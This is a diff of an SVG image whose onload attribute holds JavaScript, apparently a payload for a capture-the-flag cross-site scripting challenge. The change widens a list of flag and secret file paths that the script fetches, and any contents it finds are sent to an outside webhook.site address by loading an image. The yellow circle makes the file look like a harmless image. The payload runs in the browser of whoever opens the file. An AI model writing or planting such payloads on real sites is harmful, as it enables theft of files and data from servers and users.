@@ -1,15 +1,22 @@
 <svg xmlns="http://www.w3.org/2000/svg" onload="
-  const paths = ['/flag', '/flag.txt', '/static/flag', '/home/ctf/flag'];
+  const paths = [
+    '/flag', '/flag.txt', '/FLAG', '/FLAG.txt',
+    '/home/ctf/flag', '/home/flag.txt', '/static/flag',
+    '/secret', '/secret.txt', '/root/flag.txt',
+    '/app/flag', '/tmp/flag', '/data/flag.txt',
+    '/etc/flag', '/srv/flag', '/var/flag',
+    '/usr/local/flag.txt', '/var/www/html/flag',
+    '/flag.php', '/flag.json'
+  ];
+
   paths.forEach(p => {
-    fetch(p)
-      .then(r => r.text())
-      .then(t => {
-        if (!t.includes('Not Found')) {
-          new Image().src =
-            'https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?flag=' +
-            encodeURIComponent(p + ': ' + t);
-        }
-      });
+    fetch(p).then(r => r.text()).then(t => {
+      if (!t.includes('Not Found') && t.length < 500) {
+        new Image().src =
+          'https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?flag=' +
+          encodeURIComponent(p + ': ' + t);
+      }
+    });
   });
 ">
   <circle cx='50' cy='50' r='40' stroke='red' stroke-width='4' fill='yellow'/>
